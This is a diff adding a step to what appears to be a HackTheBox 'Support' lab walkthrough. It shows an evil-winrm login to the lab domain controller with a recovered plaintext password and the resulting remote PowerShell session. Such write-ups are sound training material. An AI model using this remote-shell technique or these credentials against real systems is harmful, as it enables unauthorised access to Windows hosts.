@@ -207,3 +207,18 @@ WINRM       10.129.230.181  5985   DC               [+] support.htb\support:Iron
 
 This user also has access over WINRM
 
+```python
+evil-winrm -i dc.support.htb -u support -p 'Ironside47pleasure40Watchful'                     
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\support\Documents> whoami
+support\support
+*Evil-WinRM* PS C:\Users\support\Documents>
+```
+
